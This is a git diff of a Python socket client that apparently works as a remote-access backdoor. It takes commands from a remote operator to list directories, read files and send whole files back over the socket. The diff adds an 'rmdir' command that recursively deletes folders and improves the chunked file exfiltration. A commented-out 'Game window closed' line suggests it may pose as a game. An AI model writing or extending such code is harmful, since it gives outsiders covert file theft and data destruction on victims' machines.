@@ -1,6 +1,5 @@
 import socket as st
-# from subprocess import Popen, PIPE
-import os
+import os,shutil
 from colorama import Fore, Style
 
 
@@ -28,24 +27,34 @@ def main():
                 else:
                     sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())
 
+            elif get_cmd.startswith('rmdir '):
+                folder_name = get_cmd.split()[1]
+                if os.path.exists(folder_name):
+                    shutil.rmtree(folder_name)
+                    sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
+                else:
+                    sock.send('The folder \'{}\' doesnt exist'.format(folder_name).encode())
+
             elif get_cmd == 'ls':
                 _dir = os.getcwd()
                 files = '\n'.join(os.listdir(_dir))
                 sock.sendall(files.encode() + b'\n')
             
             elif get_cmd.startswith('cat '):  # Read and send file contents
-                file_path = get_cmd.split(maxsplit=1)[1]
+                file_path = get_cmd.split()[1]
                 if os.path.exists(file_path) and os.path.isfile(file_path):
                     with open(file_path, "r") as f:
                         sock.sendall(f.read().encode())
                 else:
                     sock.send(b"Error: File not found\n")
 
-            elif get_cmd.startswith('download '):  # Send file for download
-                dfile = get_cmd.split(maxsplit=1)[1]
+            elif get_cmd.startswith('download '):  
+                dfile = get_cmd.split()[1]
                 if os.path.isfile(dfile):
                     with open(dfile, 'rb') as file:
-                        sock.sendall(file.read())
+                        while chnk := file.read():
+                            sock.sendall(chnk)
+    
                 else:
                     sock.send(b'Error: File does not exist\n')
 
@@ -56,9 +65,13 @@ def main():
                 sock.send('Invalid command found : {}'.format(get_cmd).encode())
 
         except Exception as err:
-            return f"Error: {err}".encode()  
+            print(err)
+            sock.send(str(err).encode())
+            continue
 
-    sock.close() 
+    sock.close()
+    # os.system('clear')
+    # print('Game window closed...')
 
 if __name__ == "__main__":
     main()
